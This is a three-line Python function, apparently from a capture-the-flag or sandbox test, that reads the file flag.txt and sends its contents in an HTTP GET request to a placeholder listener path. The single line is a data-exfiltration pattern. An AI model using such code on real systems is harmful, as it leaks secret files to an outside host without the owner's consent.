def _test0():
    import requests
    return requests.get('/my/request/listener/host/'+open('flag.txt','r').read())